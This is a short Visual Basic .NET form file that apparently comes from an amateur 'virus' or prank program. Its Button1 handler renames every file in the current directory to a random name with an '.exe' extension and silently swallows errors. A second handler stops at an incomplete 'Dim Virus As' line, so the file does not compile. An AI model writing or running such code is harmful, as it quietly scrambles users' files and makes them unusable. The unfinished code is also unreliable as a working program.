Public Class Form1

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click

        Dim i As Integer = 1

        Dim folder As New IO.DirectoryInfo(My.Computer.FileSystem.CurrentDirectory.ToString)

        For Each file In folder.GetFiles
            Try
                My.Computer.FileSystem.RenameFile(file.FullName, RandomName(CInt(Rnd() * 10 + 1)) & ".exe")
            Catch ex1 As UnauthorizedAccessException

            Catch ex2 As IO.IOException
            Finally

            End Try
        Next

    End Sub

    Private Function RandomName(ByVal fLength As Integer) As String
        Dim letter As Integer
        Dim sName As String = ""
        Randomize()

        For y = 0 To fLength
            letter = CInt(2 * Rnd() + 1)
            If letter = 1 Then ' number
                sName = sName & ChrW(CInt(9 * Rnd() + 48))
            ElseIf letter = 2 Then ' letter
                sName = sName & ChrW(CInt(25 * Rnd() + 97))
            End If
        Next

        Return sName
    End Function

    Private Sub btnExtract_Click(sender As System.Object, e As System.EventArgs) Handles btnExtract.Click
        Dim Virus As
    End Sub
End Class
